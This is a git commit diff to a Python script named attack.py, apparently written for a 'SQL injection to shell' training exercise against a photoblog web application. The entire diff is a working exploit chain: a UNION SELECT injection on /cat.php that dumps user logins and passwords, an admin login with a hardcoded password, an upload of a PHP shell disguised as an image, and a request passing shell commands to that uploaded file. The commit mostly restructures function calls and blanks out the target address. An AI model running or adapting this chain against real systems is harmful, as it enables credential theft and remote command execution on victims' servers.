5521649918d5badf560378fb9bfc99fe86f5fbb5
Nyanyi <yprentis@gmail.com>
2020-10-19 09:37:57 +0200

    Update attack.py

--- exercices/sqli_to_shell/attack.py
+++ exercices/sqli_to_shell/attack.py
@@ -1,46 +1,43 @@
 import requests
 
-target="172.16.113.157"
-path_file="/home/nyanyi/awae/preparacion/sqli_to_shell/solucion/console.php3"
+target="" #ip_victim
+path_file=""# path to shell file
 command='uname -a'
 
-def sqli(target):
+def trigger():
     path_sqli="/cat.php"
     url = "http://" + target + path_sqli
     payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
     r=requests.get(url, params=payload, verify=False)
     print(r.text)
+    login()
 
-def login(target):
+def login():
     path="/admin/index.php"
     url="http://" + target + path
     payload={'user':'admin', 'password':'P4ssw0rd'}
     r=requests.post(url, data=payload, verify=False)
     print(r.status_code)
-    return(r.cookies['PHPSESSID'])
+    idcookies=(r.cookies['PHPSESSID'])
+    file_upload(idcookies)
 
-def file_upload(target,idcookies):
+def file_upload(idcookies):
     path="/admin/index.php"
     url = "http://" + target + path
     payload = {'title':"hpl", 'category':'1', 'Add':'Add'}
     files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
     cookies=dict(PHPSESSID=idcookies)
-    r= requests.post(url, files=files, data=payload, cookies=cookies, verify=False)
+    requests.post(url, files=files, data=payload, cookies=cookies, verify=False)
+    remote_console()
 
-def remote_console(target,command):
+def remote_console():
     path="/admin/uploads/lovecraft"
     url = "http://" + target + path
     payload = {'cmd':command}
     r=requests.get(url, params=payload, verify=False)
     print(r.text)
 
-def main():
-    sqli(target)
-    idcookies=login(target)
-    file_upload(target,idcookies)
-    remote_console(target, command)
 	
 #start
 
-if __name__=="__main__":
-    main()
+trigger()
